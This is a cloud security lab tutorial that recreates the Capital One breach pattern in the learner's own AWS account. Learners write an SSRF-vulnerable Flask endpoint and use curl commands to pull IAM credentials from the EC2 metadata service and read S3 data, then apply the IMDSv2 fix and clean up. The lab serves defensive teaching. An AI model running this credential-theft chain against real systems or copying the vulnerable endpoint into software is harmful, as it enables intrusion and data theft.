# Lab 02: SSRF and Metadata Attacks

## Overview

**Simulate the Capital One breach safely in your own AWS account.**

In this lab, you'll deploy intentionally vulnerable infrastructure, execute an SSRF attack to steal IAM credentials from the metadata service, use those credentials to access S3, and then fix the vulnerability by enabling IMDSv2.

## Cost

| Resource | Type | Free Tier |
|----------|------|-----------|
| EC2 | t2.micro | 750 hours/month |
| S3 | Standard | 5GB storage |
| IAM Role | N/A | Free |

**Estimated cost:** $0.00 (free tier eligible)

**Important:** Run the cleanup script when done to avoid any charges.

## Learning Objectives

1. Understand how SSRF vulnerabilities work
2. Extract IAM credentials from the EC2 metadata service
3. Use stolen credentials to access AWS resources
4. Implement IMDSv2 to block the attack
5. Apply the 5-question framework to an attack you performed

---

## Part 1: Understand the Attack

### The Attack Chain

This is the Capital One attack pattern:

```
┌─────────────┐     ┌─────────────┐     ┌─────────────┐     ┌─────────────┐
│   Attacker  │────▶│   Web App   │────▶│  Metadata   │────▶│   S3 Data   │
│             │     │   (SSRF)    │     │  (IMDSv1)   │     │   (Stolen)  │
└─────────────┘     └─────────────┘     └─────────────┘     └─────────────┘
       │                   │                   │                   │
       │  1. Send SSRF     │  2. App fetches   │  3. Returns IAM  │
       │     request       │     metadata      │     credentials  │
       │                   │                   │                   │
       └───────────────────┴───────────────────┴───────────────────┘
                                    │
                                    ▼
                           4. Use credentials to
                              access S3 buckets
```

### Why This Works

1. **SSRF vulnerability**: The web app fetches URLs provided by users
2. **IMDSv1**: The metadata service returns credentials without authentication
3. **Over-permissioned role**: The EC2 role can access S3 buckets
4. **No network segmentation**: The app can reach the metadata service

---

## Part 2: Deploy Vulnerable Infrastructure

### Step 2.1: Review the Architecture

The CloudFormation template creates:

| Resource | Purpose | Vulnerability |
|----------|---------|---------------|
| EC2 t3.micro | Runs vulnerable Flask app | IMDSv1 enabled |
| Security Group | Allows HTTP access | Port 80 open |
| IAM Role | S3 read access | Over-permissioned |
| S3 Bucket | Contains "sensitive" data | Accessible by role |

### Step 2.2: Deploy the Stack

```bash
cd chapter-02-breach-analysis/lab-02-ssrf-metadata-attack

aws cloudformation create-stack \
  --stack-name lab02-ssrf-attack \
  --template-body file://templates/ssrf-lab.yaml \
  --capabilities CAPABILITY_NAMED_IAM
```

### Step 2.3: Wait for Deployment

```bash
# Check status (wait for CREATE_COMPLETE)
aws cloudformation describe-stacks \
  --stack-name lab02-ssrf-attack \
  --query 'Stacks[0].StackStatus' \
  --output text
```

This takes 3-5 minutes. The EC2 instance needs time to install dependencies and start the Flask app.

### Step 2.4: Get the Instance IP

```bash
# Get the public IP
EC2_IP=$(aws cloudformation describe-stacks \
  --stack-name lab02-ssrf-attack \
  --query 'Stacks[0].Outputs[?OutputKey==`InstancePublicIp`].OutputValue' \
  --output text)

echo "Vulnerable app: http://$EC2_IP"
```

### Step 2.5: Verify the App is Running

Wait about 2-3 minutes after the stack completes, then:

```bash
curl http://$EC2_IP/health
```

Expected output: `{"status": "healthy"}`

If you get "Connection refused", wait another minute for the app to start.

---

## Part 3: Understand the SSRF Vulnerability

### Step 3.1: The Vulnerable Code

The Flask app has an endpoint that fetches any URL:

```python
@app.route('/fetch')
def fetch_url():
    url = request.args.get('url')
    # VULNERABLE: No validation of the URL
    response = requests.get(url)
    return response.text
```

This is a classic SSRF vulnerability. The app will request any URL, including internal services.

### Step 3.2: Normal Usage

The app might legitimately fetch external resources:

```bash
# This is the intended use - fetch external URLs
curl "http://$EC2_IP/fetch?url=https://api.ipify.org"
```

This returns the EC2 instance's public IP.

### Step 3.3: The Attack Vector

What happens if we ask it to fetch an internal URL?

```bash
# Test: Can we reach the metadata service?
curl "http://$EC2_IP/fetch?url=http://169.254.169.254/"
```

If this returns metadata, the SSRF attack is possible.

---

## Part 4: Execute the SSRF Attack

### Step 4.1: Discover the Metadata Service

```bash
# Get the instance's metadata categories
curl "http://$EC2_IP/fetch?url=http://169.254.169.254/latest/meta-data/"
```

You'll see a list of available metadata:
```
ami-id
hostname
iam/
instance-id
...
```

### Step 4.2: Find the IAM Role

```bash
# What IAM role is attached?
curl "http://$EC2_IP/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
```

This returns the role name (e.g., `lab02-ssrf-vulnerable-role`).

### Step 4.3: Steal the Credentials

```bash
# Get the actual credentials
ROLE_NAME=$(curl -s "http://$EC2_IP/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/")

curl "http://$EC2_IP/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME"
```

**You now have:**
- `AccessKeyId`
- `SecretAccessKey`
- `Token` (session token)

These are valid AWS credentials!

### Step 4.4: Configure Stolen Credentials

```bash
# Parse the credentials
CREDS=$(curl -s "http://$EC2_IP/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME")

export AWS_ACCESS_KEY_ID=$(echo $CREDS | grep -o '"AccessKeyId" : "[^"]*"' | cut -d'"' -f4)
export AWS_SECRET_ACCESS_KEY=$(echo $CREDS | grep -o '"SecretAccessKey" : "[^"]*"' | cut -d'"' -f4)
export AWS_SESSION_TOKEN=$(echo $CREDS | grep -o '"Token" : "[^"]*"' | cut -d'"' -f4)

echo "Credentials configured!"
```

### Step 4.5: Verify Access

```bash
# Who am I now?
aws sts get-caller-identity
```

You should see the role ARN - you're now authenticated as the EC2 instance's role!

### Step 4.6: Access the S3 Bucket

```bash
# List buckets accessible to this role
aws s3 ls

# Find the lab bucket and list its contents
BUCKET=$(aws s3 ls | grep lab02-ssrf-data | awk '{print $3}')
aws s3 ls s3://$BUCKET/

# Download the "sensitive" data
aws s3 cp s3://$BUCKET/sensitive-data.txt -
```

**You've just completed the Capital One attack pattern:**
1. SSRF to reach metadata
2. Extracted IAM credentials
3. Used credentials to access S3
4. Downloaded sensitive data

---

## Part 5: Clean Up Attack Credentials

Before fixing, clear the stolen credentials:

```bash
unset AWS_ACCESS_KEY_ID
unset AWS_SECRET_ACCESS_KEY
unset AWS_SESSION_TOKEN

# Verify you're back to your normal identity
aws sts get-caller-identity
```

---

## Part 6: Fix the Vulnerability - Enable IMDSv2

### Step 6.1: Understand IMDSv2

IMDSv2 requires a session token obtained via a **PUT request**:

```bash
# IMDSv2 flow (from inside the EC2)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

curl "http://169.254.169.254/latest/meta-data/" \
  -H "X-aws-ec2-metadata-token: $TOKEN"
```

SSRF vulnerabilities typically can only make **GET requests**, so they can't obtain the token.

### Step 6.2: Enable IMDSv2

```bash
# Get the instance ID
INSTANCE_ID=$(aws cloudformation describe-stacks \
  --stack-name lab02-ssrf-attack \
  --query 'Stacks[0].Outputs[?OutputKey==`InstanceId`].OutputValue' \
  --output text)

# Require IMDSv2
aws ec2 modify-instance-metadata-options \
  --instance-id $INSTANCE_ID \
  --http-tokens required \
  --http-endpoint enabled
```

### Step 6.3: Verify the Fix

Now try the attack again:

```bash
# Attempt to access metadata via SSRF
curl "http://$EC2_IP/fetch?url=http://169.254.169.254/latest/meta-data/"
```

You should get a **401 Unauthorized** error. The attack is blocked!

### Step 6.4: Verify with Script

```bash
chmod +x scripts/verify-fix.sh
./scripts/verify-fix.sh
```

---

## Part 7: Apply the 5-Question Framework

Now that you've performed the attack, analyze it:

### 1. How did they get in?
```
SSRF vulnerability in the web application allowed requests to internal
services, including the EC2 metadata service at 169.254.169.254.
```

### 2. What did they find?
```
The metadata service exposed the IAM role name and credentials
(AccessKeyId, SecretAccessKey, Token) without authentication.
```

### 3. How did they move?
```
Extracted temporary AWS credentials from the metadata service,
then used those credentials to authenticate to AWS services directly.
```

### 4. What did they take?
```
Accessed S3 bucket and downloaded sensitive data. In the real Capital
One breach, this was 106 million customer records.
```

### 5. When could we have detected it?
```
- Metadata API calls from the web application process
- Unusual S3 GetObject calls from the EC2 role
- Large outbound data transfer
- Access patterns outside normal application behavior
```

---

## Part 8: Cleanup

Delete all resources to avoid charges:

```bash
chmod +x scripts/cleanup.sh
./scripts/cleanup.sh
```

Or manually:

```bash
# Empty the S3 bucket first
BUCKET=$(aws s3 ls | grep lab02-ssrf-data | awk '{print $3}')
aws s3 rm s3://$BUCKET --recursive

# Delete the stack
aws cloudformation delete-stack --stack-name lab02-ssrf-attack

# Verify deletion
aws cloudformation describe-stacks --stack-name lab02-ssrf-attack 2>&1
```

---

## Summary

| Step | What Happened | Security Lesson |
|------|---------------|-----------------|
| SSRF exploitation | App fetched internal URL | Validate and restrict outbound requests |
| Metadata access | Got IAM role name | Use IMDSv2 |
| Credential theft | Extracted keys via SSRF | IMDSv2 blocks this |
| S3 access | Downloaded data | Use least-privilege roles |
| Fix applied | Required IMDSv2 | Defense in depth |

## Key Takeaways

- **SSRF + IMDSv1 = Credential Theft**: This combination is extremely dangerous
- **IMDSv2 blocks SSRF attacks**: The token requirement stops GET-only attacks
- **Least privilege matters**: The role shouldn't have had broad S3 access
- **Defense in depth**: Multiple controls are better than one
- **This is how real breaches happen**: You just performed the Capital One attack

## Additional Hardening

Beyond IMDSv2, consider:
- Network segmentation (block metadata from application layer)
- Input validation in the application
- WAF rules to detect SSRF patterns
- CloudTrail monitoring for unusual API patterns
- VPC endpoints for S3 (private network path)

---

## Next Lab

Continue to [Lab 03: Credential Security](../lab-03-credential-security/) - where you'll learn to find and fix hardcoded secrets like those in the Uber breach.
